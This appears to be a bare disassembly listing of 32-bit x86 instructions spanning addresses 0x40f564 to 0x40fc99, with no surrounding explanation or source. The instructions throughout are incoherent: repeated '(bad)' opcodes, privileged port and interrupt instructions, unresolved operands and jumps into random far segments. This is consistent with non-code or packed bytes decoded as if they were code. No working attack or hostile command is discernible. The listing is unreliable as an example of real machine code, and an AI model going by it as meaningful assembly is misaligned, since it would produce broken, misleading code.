  40f564:	aaa    
  40f565:	das    
  40f566:	mov    eax,ds:0x3ccd63c6
  40f56b:	or     al,ch
  40f56d:	sar    BYTE PTR [edi+eax*2+0x64],cl
  40f571:	int3   
  40f572:	sub    BYTE PTR [ebx],dh
  40f574:	enter  0x2a3,0x59
  40f578:	mov    al,0x2f
  40f57a:	sub    eax,ebx
  40f57c:	addr16 jle 0x40f58c
  40f57f:	push   ebx
  40f580:	test   al,0xa0
  40f582:	cmp    eax,0xcbcbcb0f
  40f587:	push   edi
  40f588:	xchg   edi,eax
  40f589:	xchg   edi,eax
  40f58a:	xchg   edi,eax
  40f58b:	das    
  40f58c:	(bad)  
  40f58d:	(bad)  
  40f58e:	outs   dx,DWORD PTR ds:[esi]
  40f58f:	std    
  40f590:	(bad)  
  40f591:	push   edi
  40f592:	sub    dl,BYTE PTR [ebp-0x54a952b6]
  40f598:	aad    0x17
  40f59a:	pop    ss
  40f59b:	pop    ss
  40f59c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f59d:	out    0xe6,eax
  40f59f:	out    0xe6,al
  40f5a1:	imul   DWORD PTR [esi]
  40f5a3:	mov    cs,WORD PTR cs:[ebp-0x42307071]
  40f5aa:	std    
  40f5ab:	ins    DWORD PTR es:[edi],dx
  40f5ac:	outs   dx,DWORD PTR ds:[esi]
  40f5ad:	sti    
  40f5ae:	call   0xc13132ea
  40f5b3:	je     0x40f56e
  40f5b5:	push   esp
  40f5b6:	and    dl,BYTE PTR [ecx+0x75cea192]
  40f5bc:	cmp    BYTE PTR [eax],bl
  40f5be:	or     al,0xb8
  40f5c0:	jp     0x40f5a7
  40f5c2:	or     bh,BYTE PTR [ebp+0x39854f5e]
  40f5c8:	xchg   ecx,esp
  40f5ca:	mov    ?,WORD PTR [esi]
  40f5cc:	add    eax,0xe28270f3
  40f5d1:	mov    ?,WORD PTR [eax-0x227653d1]
  40f5d7:	jge    0x40f622
  40f5d9:	pop    ss
  40f5da:	sub    eax,0xd99155a8
  40f5df:	outs   dx,BYTE PTR ds:[esi]
  40f5e0:	scas   al,BYTE PTR es:[edi]
  40f5e1:	fwait
  40f5e2:	sbb    DWORD PTR [edi],esi
  40f5e4:	into   
  40f5e5:	std    
  40f5e6:	add    eax,0x1bc35c20
  40f5eb:	push   0x76
  40f5ed:	out    0xd5,al
  40f5ef:	cmc    
  40f5f0:	dec    ebp
  40f5f1:	push   esi
  40f5f2:	push   esi
  40f5f3:	xlat   BYTE PTR ds:[ebx]
  40f5f4:	pop    ecx
  40f5f5:	ds jge 0x40f58e
  40f5f8:	inc    eax
  40f5f9:	out    0x6a,eax
  40f5fb:	ins    BYTE PTR es:[edi],dx
  40f5fc:	xor    al,0xaa
  40f5fe:	xor    al,0x9b
  40f600:	or     eax,0x250df3be
  40f605:	stos   BYTE PTR es:[edi],al
  40f606:	(bad)  
  40f608:	loopne 0x40f611
  40f60a:	ds jno 0x40f614
  40f60d:	sahf   
  40f60e:	cmp    al,0xc2
  40f610:	dec    di
  40f612:	jo     0x40f5fd
  40f614:	jb     0x40f5e2
  40f616:	jmp    0xb4f8:0x2ea716ea
  40f61d:	ss scas eax,DWORD PTR es:[edi]
  40f61f:	lock jmp 0xff7a8d54
  40f625:	in     al,dx
  40f626:	inc    ebp
  40f627:	out    dx,al
  40f628:	pop    esi
  40f629:	in     al,dx
  40f62a:	push   ecx
  40f62b:	test   eax,0x8ce9d02c
  40f630:	jle    0x40f674
  40f632:	jecxz  0x40f66e
  40f634:	ss jbe 0x40f5d8
  40f637:	add    ah,BYTE PTR [edx+edi*4]
  40f63a:	push   esi
  40f63b:	cs xchg edi,eax
  40f63d:	inc    ebx
  40f63e:	pop    esi
  40f63f:	lds    esi,FWORD PTR [esi+0x53]
  40f642:	sub    al,BYTE PTR [eax+0x4958994]
  40f648:	(bad)  
  40f649:	lods   eax,DWORD PTR ds:[esi]
  40f64a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f64b:	rol    BYTE PTR [eax-0x2a],1
  40f64e:	push   es
  40f64f:	loopne 0x40f607
  40f651:	dec    edx
  40f652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f653:	mov    ds:0xa9d1b8f,al
  40f658:	in     al,dx
  40f659:	mov    dh,0xeb
  40f65b:	sbb    esi,esi
  40f65d:	scas   al,BYTE PTR es:[edi]
  40f65e:	ja     0x40f6ac
  40f660:	sar    DWORD PTR [edx+0x585d5d09],1
  40f666:	pop    eax
  40f667:	pusha  
  40f668:	jbe    0x40f6e0
  40f66a:	ss xchg ebx,eax
  40f66c:	fwait
  40f66d:	int    0xec
  40f66f:	mov    edi,0x9712e974
  40f674:	das    
  40f675:	pop    edi
  40f676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f677:	xlat   BYTE PTR ds:[ebx]
  40f678:	jmp    0x40f64b
  40f67a:	push   0xaeebb834
  40f67f:	mov    ebx,0xcd9d9d98
  40f684:	fs push cs
  40f686:	mov    fs,WORD PTR [edx-0x31188c78]
  40f68c:	jno    0x40f682
  40f68e:	call   0x37782ce4
  40f693:	or     DWORD PTR [ebx-0xb],eax
  40f696:	in     eax,dx
  40f697:	ret    0x6c30
  40f69a:	popf   
  40f69b:	aas    
  40f69c:	jg     0x40f69c
  40f69e:	fcomp  DWORD PTR [ecx-0x156198cd]
  40f6a4:	je     0x40f6e0
  40f6a6:	sub    ebp,DWORD PTR [eax]
  40f6a8:	and    dh,BYTE PTR [ebx]
  40f6aa:	test   eax,0xe6510c74
  40f6af:	jne    0x40f6af
  40f6b1:	fnsave [esp+edx*8+0x168a3d59]
  40f6b8:	mov    cl,BYTE PTR [eax-0x32240c4]
  40f6be:	out    0xd5,al
  40f6c0:	pop    es
  40f6c1:	adc    DWORD PTR [edx],0xffffffa2
  40f6c4:	shl    DWORD PTR [eax-0x30],0x1f
  40f6c8:	or     al,0x6
  40f6ca:	fistp  DWORD PTR [ebx-0x38946465]
  40f6d0:	mov    ds,WORD PTR ds:0xef77b73b
  40f6d6:	fdivrp st(1),st
  40f6d8:	cmp    ebp,edi
  40f6da:	mov    esp,0xab5ea973
  40f6df:	mov    ebp,0x9fa7a9f3
  40f6e4:	sahf   
  40f6e5:	outs   dx,BYTE PTR ds:[esi]
  40f6e6:	call   0x173bf9e7
  40f6eb:	pop    ss
  40f6ec:	cdq    
  40f6ed:	popf   
  40f6ee:	popf   
  40f6ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6f0:	fldcw  WORD PTR [edx+esi*2-0x31]
  40f6f4:	mov    ebp,0x849322f7
  40f6f9:	mov    ch,0xd5
  40f6fb:	push   ebp
  40f6fc:	mov    dh,0xb6
  40f6fe:	mov    dh,0x58
  40f700:	pop    ebx
  40f701:	pop    ebp
  40f702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f703:	(bad)  [edx+0x11]
  40f706:	inc    ebp
  40f707:	xchg   ecx,eax
  40f708:	dec    edx
  40f709:	jle    0x40f734
  40f70b:	and    eax,0x59a42e5e
  40f710:	test   al,0x4e
  40f712:	iret   
  40f713:	adc    BYTE PTR [ebp+0x6ff966fd],dh
  40f719:	ins    DWORD PTR es:[edi],dx
  40f71a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f71b:	xchg   DWORD PTR [ecx+0x2],eax
  40f71e:	mov    ecx,0x9191a7e0
  40f723:	xchg   ecx,eax
  40f724:	arpl   WORD PTR [esi+ebp*2],di
  40f727:	pop    es
  40f728:	gs inc esp
  40f72a:	mov    fs,WORD PTR [edi+0x4b9510b2]
  40f730:	and    eax,0x25252015
  40f735:	and    ecx,0xffffff90
  40f738:	(bad)  
  40f739:	pusha  
  40f73a:	sar    dl,0xfa
  40f73d:	xchg   esi,eax
  40f73e:	cmp    eax,0x280e5caf
  40f743:	push   ebp
  40f744:	retf   0xaad4
  40f747:	gs out dx,al
  40f749:	cwde   
  40f74a:	fwait
  40f74b:	loopne 0x40f70e
  40f74d:	xlat   BYTE PTR ds:[ebx]
  40f74e:	dec    esp
  40f74f:	xor    DWORD PTR [ecx],esi
  40f751:	faddp  st(0),st
  40f753:	or     esi,esi
  40f755:	repnz leave 
  40f757:	enter  0xd3a3,0xbe
  40f75b:	xor    DWORD PTR [ebp-0x527ce113],0xffffffd3
  40f762:	les    esi,FWORD PTR [ecx-0x7e]
  40f765:	out    dx,eax
  40f766:	(bad)  
  40f767:	mov    eax,es:0x7e80820d
  40f76d:	mov    edi,0x7c00c85f
  40f772:	(bad)  
  40f774:	cli    
  40f775:	rol    BYTE PTR [edi+0x1aaaf43e],1
  40f77b:	les    esi,FWORD PTR [esi-0x1b]
  40f77e:	push   es
  40f77f:	je     0x40f7fe
  40f781:	mov    eax,ds:0x75c7e826
  40f786:	add    esp,DWORD PTR [esi-0x1]
  40f789:	aam    0x36
  40f78b:	cmc    
  40f78c:	in     eax,dx
  40f78d:	and    al,0x63
  40f78f:	arpl   WORD PTR [ebx-0x6],sp
  40f792:	mov    esp,0xbca0366c
  40f797:	gs jle 0x40f7c1
  40f79a:	xlat   BYTE PTR ds:[ebx]
  40f79b:	pop    esp
  40f79c:	mov    esi,0xee10a915
  40f7a1:	mov    edx,0x2a5bc4cd
  40f7a6:	mov    cl,0x67
  40f7a8:	iret   
  40f7a9:	push   ds
  40f7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ad:	imul   esi,DWORD PTR [edx+ebx*1],0x71c66b99
  40f7b4:	ins    BYTE PTR es:[edi],dx
  40f7b5:	sub    eax,0x8b56adf5
  40f7ba:	jp     0x40f779
  40f7bc:	into   
  40f7bd:	sbb    eax,0xc2c1dc77
  40f7c2:	ret    0xf502
  40f7c5:	jp     0x40f7a4
  40f7c7:	fisub  WORD PTR [ebx-0x60]
  40f7ca:	mov    eax,ds:0x2793c9f0
  40f7cf:	mov    ecx,0x4e92e974
  40f7d4:	mov    dl,BYTE PTR [edx-0x56ad4ece]
  40f7da:	xor    al,0xfd
  40f7dc:	xchg   esi,eax
  40f7dd:	mov    bh,0xbc
  40f7df:	in     eax,0x7
  40f7e1:	(bad)  
  40f7e3:	fdivrp st(7),st
  40f7e5:	jle    0x40f7ce
  40f7e7:	cdq    
  40f7e8:	xor    esp,DWORD PTR [edi+0x3e]
  40f7eb:	call   esp
  40f7ed:	push   ebx
  40f7ee:	dec    edi
  40f7ef:	cmp    eax,0xf1f8fc7a
  40f7f4:	push   ebx
  40f7f5:	fcmovu st,st(7)
  40f7f7:	pop    edi
  40f7f8:	bound  edx,QWORD PTR [eax+edi*8-0x47]
  40f7fc:	retf   
  40f7fd:	xlat   BYTE PTR ds:[ebx]
  40f7fe:	in     eax,dx
  40f7ff:	jp     0x40f7e8
  40f801:	fsub   DWORD PTR [edx]
  40f803:	js     0x40f799
  40f805:	fistp  WORD PTR [edi+0x674ae1e6]
  40f80b:	adc    DWORD PTR [ebx-0x1bb0bef8],edi
  40f811:	daa    
  40f812:	add    al,0x12
  40f814:	fcomip st,st(7)
  40f816:	retf   
  40f817:	or     ecx,DWORD PTR [ebx]
  40f819:	or     ecx,DWORD PTR [ebx]
  40f81b:	neg    ebp
  40f81d:	ja     0x40f7fe
  40f81f:	loope  0x40f812
  40f821:	icebp  
  40f822:	icebp  
  40f823:	cmp    ebp,esi
  40f825:	mov    edi,0x4bc3feff
  40f82a:	dec    ebx
  40f82b:	dec    ebx
  40f82c:	fist   WORD PTR [edi+ebp*4-0x29]
  40f830:	daa    
  40f831:	imul   esi,DWORD PTR [ebp+0x638e355a],0x2e
  40f838:	pop    esp
  40f839:	mov    eax,0x2793c9c0
  40f83e:	pop    ecx
  40f83f:	pop    ecx
  40f840:	pop    ecx
  40f841:	loope  0x40f81b
  40f843:	or     ebp,DWORD PTR [edi]
  40f845:	push   eax
  40f846:	sub    dl,BYTE PTR [ebp-0x13142858]
  40f84c:	(bad)  [edi+0x59d9d98f]
  40f852:	data16 cmp WORD PTR [bx+si-0x39],di
  40f858:	sbb    eax,0x8e475dc
  40f85d:	add    ch,al
  40f85f:	cmc    
  40f860:	sti    
  40f861:	pop    esp
  40f862:	pop    ecx
  40f863:	pop    ecx
  40f864:	mov    eax,ds:0xb1b16add
  40f869:	mov    esi,0x3a0a6cae
  40f86e:	dec    esi
  40f86f:	inc    ecx
  40f870:	mov    al,ds:0x6c6d77f5
  40f875:	hlt    
  40f876:	repnz test bh,ch
  40f879:	stos   BYTE PTR es:[edi],al
  40f87a:	imul   ecx,esi,0x4b
  40f87d:	gs or  bl,bl
  40f880:	gs (bad) 
  40f882:	es cli 
  40f884:	shl    BYTE PTR [ebp+0x38eb980f],1
  40f88a:	jno    0x40f89c
  40f88c:	nop
  40f88d:	mov    edx,0xb7b7b71d
  40f892:	sbb    DWORD PTR [esi],ecx
  40f894:	xchg   DWORD PTR [ebx+ecx*8+0x59d51b65],edx
  40f89b:	sub    dl,BYTE PTR [ebp-0x51fb66d8]
  40f8a1:	call   0x3110:0x60c02569
  40f8a8:	sbb    BYTE PTR [esp+ebp*4+0x6f],al
  40f8ac:	mov    ah,0x39
  40f8ae:	jno    0x40f8a2
  40f8b0:	mov    esp,0x3531ec4d
  40f8b5:	cmp    esi,eax
  40f8b7:	clc    
  40f8b8:	les    eax,FWORD PTR [ebx+edi*2]
  40f8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8bd:	cmp    DWORD PTR [ebp+0x3f6b7121],esi
  40f8c3:	out    0x63,al
  40f8c5:	push   ebx
  40f8c6:	jp     0x40f885
  40f8c8:	fimul  WORD PTR [eax-0x56ad4ff5]
  40f8ce:	lock aam 0x53
  40f8d1:	dec    edi
  40f8d2:	mov    ch,0x8b
  40f8d4:	aas    
  40f8d5:	stc    
  40f8d6:	in     eax,dx
  40f8d7:	imul   edi,DWORD PTR [ebx-0x4bbcffbf],0x6f
  40f8de:	aas    
  40f8df:	or     al,0x87
  40f8e1:	call   0x710c:0x10876390
  40f8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8e9:	arpl   WORD PTR [ebx-0x1b],bx
  40f8ec:	inc    ecx
  40f8ed:	iret   
  40f8ee:	(bad)  
  40f8ef:	jmp    0x2dbd620f
  40f8f4:	mov    bh,0x9e
  40f8f6:	stos   DWORD PTR es:[edi],eax
  40f8f7:	inc    esi
  40f8f8:	in     al,dx
  40f8f9:	je     0x40f947
  40f8fb:	(bad)  
  40f8fc:	js     0x40f8b1
  40f8fe:	outs   dx,BYTE PTR ds:[esi]
  40f8ff:	hlt    
  40f900:	sti    
  40f901:	pop    edx
  40f902:	lods   eax,DWORD PTR ds:[esi]
  40f903:	inc    esi
  40f904:	mov    bl,0xd9
  40f906:	fs iret 
  40f908:	sahf   
  40f909:	cmp    eax,0xb9b5e4b6
  40f90e:	jg     0x40f8cf
  40f910:	fbld   TBYTE PTR [edi-0x4d4e952b]
  40f916:	mov    dl,0x42
  40f918:	sbb    BYTE PTR [esi+0xe75ebd4],al
  40f91e:	pop    ds
  40f91f:	ds int3 
  40f921:	(bad)  
  40f923:	pushf  
  40f924:	mov    ch,0xea
  40f926:	sbb    edi,ebp
  40f928:	jle    0x40f99d
  40f92a:	jae    0x40f8bf
  40f92c:	adc    esp,DWORD PTR [edi]
  40f92e:	dec    esi
  40f92f:	jo     0x40f912
  40f931:	ret    0x8605
  40f934:	inc    ebx
  40f935:	cmc    
  40f936:	fiadd  WORD PTR [esi]
  40f938:	cmc    
  40f939:	sbb    bh,bh
  40f93b:	jp     0x40f94d
  40f93d:	add    al,0x2c
  40f93f:	cs cs jb 0x40f927
  40f943:	enter  0xa991,0xb7
  40f947:	mov    edi,0xf5dfedfd
  40f94c:	ror    DWORD PTR [edi],0x7e
  40f94f:	lock add ebp,DWORD PTR [edi]
  40f952:	mov    esi,0x9f73e2f8
  40f957:	(bad)  
  40f958:	hlt    
  40f959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f95a:	push   eax
  40f95c:	cdq    
  40f95d:	addr16 sahf 
  40f95f:	jns    0x40f98b
  40f961:	push   esp
  40f962:	push   eax
  40f963:	sar    eax,0x90
  40f966:	repnz pushf 
  40f968:	mov    dl,0x88
  40f96a:	adc    DWORD PTR [eax-0x158511fe],edi
  40f970:	sub    DWORD PTR [ecx+0x5e],0xe8973ec1
  40f977:	xchg   DWORD PTR [ebp+0x313aa952],esp
  40f97d:	xor    DWORD PTR [ecx-0x42211099],esi
  40f983:	or     ecx,DWORD PTR [ebx+0x4b]
  40f986:	dec    ebx
  40f987:	sti    
  40f988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f98a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f98b:	out    0x5e,eax
  40f98d:	sti    
  40f98e:	fcmovbe st,st(7)
  40f990:	push   ds
  40f991:	pop    edx
  40f992:	pop    edx
  40f993:	pop    edx
  40f994:	jp     0x40f973
  40f996:	clc    
  40f997:	clc    
  40f998:	clc    
  40f999:	test   BYTE PTR [ebx-0x1a523d4c],bl
  40f99f:	mov    eax,0xad40b0b0
  40f9a4:	push   esi
  40f9a5:	jecxz  0x40f983
  40f9a7:	mov    ecx,0x6adbb473
  40f9ac:	int3   
  40f9ad:	jbe    0x40f96a
  40f9af:	pop    ebp
  40f9b0:	mov    ds,WORD PTR [edi]
  40f9b2:	aas    
  40f9b3:	into   
  40f9b4:	mov    ebp,DWORD PTR [edi]
  40f9b6:	mov    esi,0xfcc21968
  40f9bb:	cld    
  40f9bc:	mov    esp,0x68d1179a
  40f9c1:	xor    BYTE PTR [ecx],dh
  40f9c3:	ds into 
  40f9c5:	mov    esi,0x7839fbfd
  40f9ca:	(bad)  
  40f9cb:	sbb    eax,0x6ed04278
  40f9d0:	mov    ch,0xe8
  40f9d2:	je     0x40fa0e
  40f9d4:	ss das 
  40f9d6:	shl    DWORD PTR [eax+0x30],0xb0
  40f9da:	dec    esp
  40f9db:	and    esi,edx
  40f9dd:	div    ebx
  40f9df:	sbb    DWORD PTR [ebp+0x83996f2],eax
  40f9e5:	xchg   ecx,eax
  40f9e6:	dec    edx
  40f9e7:	icebp  
  40f9e8:	pushf  
  40f9e9:	call   0x52f3:0xc40cf220
  40f9f0:	data16 loopne 0x40f993
  40f9f3:	or     ebp,DWORD PTR [ecx-0x1bcf3c29]
  40f9f9:	loopne 0x40f97c
  40f9fb:	add    edx,DWORD PTR [ebx+ebp*1-0x512245eb]
  40fa02:	jb     0x40f98f
  40fa04:	or     DWORD PTR es:[ebp-0x5c996892],ebx
  40fa0b:	xchg   ecx,eax
  40fa0c:	xor    cl,BYTE PTR [edi+eax*4]
  40fa0f:	mov    ch,bl
  40fa11:	cmp    esp,edi
  40fa13:	push   ecx
  40fa14:	adc    al,0x71
  40fa16:	in     eax,0xea
  40fa18:	cmp    dl,BYTE PTR [edi-0x7df6a9a9]
  40fa1e:	gs cmp eax,0xb191bc0e
  40fa24:	imul   ebp,esp,0x5f053b24
  40fa2a:	lds    esi,FWORD PTR [ecx+0x7c]
  40fa2d:	fld    TBYTE PTR [ebx+0x6edbe701]
  40fa33:	adc    BYTE PTR [eax+0xf],al
  40fa36:	int3   
  40fa37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa38:	xchg   BYTE PTR [esi],cl
  40fa3a:	push   edx
  40fa3b:	es inc esp
  40fa3d:	push   ecx
  40fa3e:	push   0xfffffff4
  40fa40:	push   ebx
  40fa41:	test   BYTE PTR [ecx+0x22],ah
  40fa44:	in     al,0xd2
  40fa46:	jl     0x40fab6
  40fa48:	push   edx
  40fa49:	mov    ebx,0xbd448c4c
  40fa4e:	adc    eax,0x6197406e
  40fa53:	dec    esp
  40fa54:	dec    esp
  40fa55:	dec    esp
  40fa56:	xor    BYTE PTR [ebx],dh
  40fa58:	xor    eax,DWORD PTR [ebx-0x53]
  40fa5b:	push   esi
  40fa5c:	mov    bl,0x1c
  40fa5e:	xlat   BYTE PTR ds:[ebx]
  40fa5f:	and    BYTE PTR [esi+0x5675f5f5],cl
  40fa65:	push   esi
  40fa66:	push   esi
  40fa67:	push   0xbef8dbb7
  40fa6c:	iret   
  40fa6d:	(bad)  
  40fa6f:	sbb    al,0x7b
  40fa71:	imul   esi
  40fa73:	mov    ch,0xf3
  40fa75:	(bad)  
  40fa77:	(bad)  
  40fa78:	pop    ebx
  40fa79:	pop    ebx
  40fa7a:	pop    ebx
  40fa7b:	jecxz  0x40fa02
  40fa7d:	pop    ss
  40fa7e:	pop    esi
  40fa7f:	loopne 0x40fa63
  40fa81:	lds    ecx,FWORD PTR [ebx-0x582040c]
  40fa87:	std    
  40fa88:	mov    esi,0x60618ebd
  40fa8d:	cs icebp 
  40fa8f:	fbstp  TBYTE PTR [ebp-0x29]
  40fa92:	pop    ebp
  40fa93:	sbb    al,0x3a
  40fa95:	je     0x40fa1f
  40fa97:	mov    DWORD PTR [ecx-0x3d95e5f7],ecx
  40fa9d:	dec    edi
  40fa9e:	xor    BYTE PTR [ebx],bh
  40faa0:	cmp    edi,ebx
  40faa2:	cli    
  40faa3:	xlat   BYTE PTR ds:[ebx]
  40faa4:	mov    ebp,0x7faf75ee
  40faa9:	jmp    0x3fb3:0xf6bea7a9
  40fab0:	sti    
  40fab1:	mov    bl,0xff
  40fab3:	jbe    0x40fb1a
  40fab5:	gs in  eax,0xa
  40fab8:	retf   0x6f5a
  40fabb:	es push eax
  40fabd:	and    al,0xce
  40fabf:	xor    ah,BYTE PTR [ecx+ebx*1+0x41]
  40fac3:	jbe    0x40fa5b
  40fac5:	dec    ebx
  40fac6:	push   ss
  40fac7:	(bad)  
  40fac8:	out    0xd1,eax
  40faca:	outs   dx,DWORD PTR ds:[esi]
  40facb:	sar    DWORD PTR [edx],1
  40facd:	cli    
  40face:	fiadd  DWORD PTR [ebx]
  40fad0:	inc    eax
  40fad1:	int3   
  40fad2:	iret   
  40fad3:	iret   
  40fad4:	iret   
  40fad5:	mov    esp,0x7b6f6ded
  40fada:	jmp    0x40fa77
  40fadc:	(bad)  
  40fade:	out    0x37,al
  40fae0:	iret   
  40fae1:	int3   
  40fae2:	int3   
  40fae3:	fcomp  QWORD PTR [ebp+0x2e]
  40fae6:	xchg   edi,eax
  40fae7:	imul   edx,ebp,0x6a
  40faea:	aad    0x13
  40faec:	inc    edx
  40faed:	pop    eax
  40faee:	sub    bh,0x76
  40faf1:	inc    edi
  40faf2:	repz fstp DWORD PTR [ebx-0x5271c721]
  40faf9:	pop    edx
  40fafa:	je     0x40faf2
  40fafc:	in     al,dx
  40fafd:	pop    ecx
  40fafe:	sbb    edx,eax
  40fb00:	in     al,0x66
  40fb02:	mov    ecx,0x9cbb76ed
  40fb07:	cmp    BYTE PTR [ecx-0x3e],dh
  40fb0a:	xor    ah,BYTE PTR [eax-0x2d]
  40fb0d:	inc    edi
  40fb0e:	inc    ecx
  40fb0f:	adc    BYTE PTR [eax],dh
  40fb11:	xor    eax,0xa5bec535
  40fb16:	and    eax,0xb34f4cf6
  40fb1b:	je     0x40fb0d
  40fb1d:	and    ch,cl
  40fb1f:	inc    esi
  40fb20:	ret    
  40fb21:	or     al,BYTE PTR [ecx-0x5344892]
  40fb27:	ficomp DWORD PTR [edx]
  40fb29:	std    
  40fb2a:	pop    esi
  40fb2b:	(bad)  
  40fb2c:	jbe    0x40fae9
  40fb2e:	dec    ebp
  40fb2f:	dec    edi
  40fb30:	pop    es
  40fb31:	int3   
  40fb32:	and    al,0x86
  40fb34:	leave  
  40fb35:	or     al,BYTE PTR [ecx+0x671d90d4]
  40fb3b:	push   ds
  40fb3c:	mov    ebp,0xdea0d71
  40fb41:	jmp    0xd46:0x45aa39db
  40fb48:	aam    0xc
  40fb4a:	shl    DWORD PTR [ebx],0x45
  40fb4d:	mov    al,ds:0xf4f818a0
  40fb52:	hlt    
  40fb53:	xor    al,0x41
  40fb55:	test   eax,0xeac71244
  40fb5a:	stc    
  40fb5b:	jne    0x40fb64
  40fb5d:	mov    edx,0x6122a536
  40fb62:	in     al,0x4e
  40fb64:	outs   dx,DWORD PTR ds:[esi]
  40fb65:	ja     0x40fba4
  40fb67:	dec    ebp
  40fb68:	stc    
  40fb69:	arpl   WORD PTR ds:0xe9d3a3cf,di
  40fb6f:	mov    WORD PTR [edi+ebx*1-0x5454fefc],ds
  40fb76:	stos   DWORD PTR es:[edi],eax
  40fb77:	imul   edi,DWORD PTR [edx+ecx*8+0x3a6a6ed],0x27
  40fb7f:	mov    DWORD PTR [ecx+0x5e391fe],edx
  40fb85:	push   eax
  40fb86:	arpl   dx,bx
  40fb88:	sbb    BYTE PTR [ecx+eax*2],al
  40fb8b:	jge    0x40fb98
  40fb8d:	iret   
  40fb8e:	repz xchg ecx,eax
  40fb90:	xor    cl,cl
  40fb92:	or     al,0x96
  40fb94:	sbb    ecx,ecx
  40fb96:	add    edx,DWORD PTR [eax-0x7b121e89]
  40fb9c:	or     ah,bl
  40fb9e:	loopne 0x40fb3d
  40fba0:	jmp    0x2767658e
  40fba5:	daa    
  40fba6:	inc    edi
  40fba7:	repnz mov cl,0x77
  40fbaa:	cmp    bl,BYTE PTR ds:0x59575756
  40fbb0:	pop    edi
  40fbb1:	pop    edi
  40fbb2:	inc    edi
  40fbb3:	or     BYTE PTR [ecx+0x7d],ah
  40fbb6:	clc    
  40fbb7:	xchg   ebx,eax
  40fbb8:	xchg   ebx,eax
  40fbb9:	xchg   ebx,eax
  40fbba:	cli    
  40fbbb:	cmp    DWORD PTR [ebp-0x42],esi
  40fbbe:	(bad)  
  40fbbf:	lods   eax,DWORD PTR ds:[esi]
  40fbc0:	sub    eax,0xcd3e9f4e
  40fbc5:	jmp    0x452ea39d
  40fbca:	sahf   
  40fbcb:	xchg   ebp,eax
  40fbcc:	xchg   ebp,eax
  40fbcd:	xchg   ebp,eax
  40fbce:	mov    ds:0xfd1e8f47,eax
  40fbd3:	and    ebx,edi
  40fbd5:	test   edi,0xeee6e6e7
  40fbdb:	fidiv  WORD PTR [edi-0x566e2091]
  40fbe1:	test   eax,0xa952c5a9
  40fbe6:	and    al,0xc2
  40fbe8:	xor    BYTE PTR [esi+esi*2+0x76],ah
  40fbec:	xchg   esi,eax
  40fbed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbef:	and    eax,0xca6ad1d
  40fbf4:	mov    edi,ebp
  40fbf6:	jle    0x40fc57
  40fbf8:	dec    ecx
  40fbf9:	xchg   esi,eax
  40fbfa:	xor    ah,ah
  40fbfc:	lea    ebp,[edi+0x7c]
  40fbff:	jecxz  0x40fc1c
  40fc01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc04:	dec    cl
  40fc06:	dec    edi
  40fc07:	push   esp
  40fc09:	dec    edi
  40fc0a:	inc    esp
  40fc0c:	cdq    
  40fc0d:	xor    esp,DWORD PTR [edi+0x4e]
  40fc10:	mov    ds:0xe1818090,al
  40fc15:	outs   dx,BYTE PTR ds:[esi]
  40fc16:	int    0x2f
  40fc18:	mov    bh,0xb9
  40fc1a:	test   dh,ch
  40fc1c:	cmp    DWORD PTR [edi+0x321cca30],edi
  40fc22:	frstor [edi-0x2857c651]
  40fc28:	jmp    0x40fc8d
  40fc2a:	(bad)  
  40fc2c:	cld    
  40fc2d:	lock mov ebx,0x37c6f8de
  40fc33:	mov    esi,0xefbbeee1
  40fc38:	jle    0x40fcaa
  40fc3a:	jb     0x40fcae
  40fc3c:	jb     0x40fc10
  40fc3e:	xor    DWORD PTR fs:[edx],esi
  40fc41:	test   BYTE PTR [edi-0x1c],dl
  40fc44:	sbb    eax,0xddcdfb71
  40fc49:	outs   dx,DWORD PTR ds:[esi]
  40fc4a:	pop    esp
  40fc4b:	cmp    bl,0xf7
  40fc4e:	out    dx,eax
  40fc4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc50:	push   esp
  40fc51:	sub    dh,BYTE PTR [ecx+0x18e1b1b1]
  40fc57:	jp     0x40fcbe
  40fc59:	xchg   BYTE PTR [ecx],ah
  40fc5b:	mov    eax,0xc71c562a
  40fc60:	pushf  
  40fc61:	aas    
  40fc62:	jg     0x40fc02
  40fc64:	in     eax,0xe5
  40fc66:	cmp    eax,DWORD PTR gs:[ebp+0xccccf78]
  40fc6d:	mov    bl,0x33
  40fc6f:	xor    ebp,esp
  40fc71:	fnstenv [ebx+0x585f987]
  40fc77:	neg    BYTE PTR [edi]
  40fc79:	cmp    BYTE PTR [eax-0x31],ah
  40fc7c:	in     eax,dx
  40fc7d:	cmc    
  40fc7e:	jp     0x40fca9
  40fc80:	pop    edx
  40fc81:	call   0xbbb5e5fc
  40fc86:	sub    ah,BYTE PTR [ebx]
  40fc88:	xchg   ebx,eax
  40fc89:	(bad)  
  40fc8a:	(bad)  
  40fc8b:	mov    esi,0x19ccb289
  40fc90:	add    ebp,ecx
  40fc92:	ja     0x40fcc8
  40fc94:	popf   
  40fc95:	out    0x22,eax
  40fc97:	pop    es
  40fc98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc99:	mov    ah,0xd0
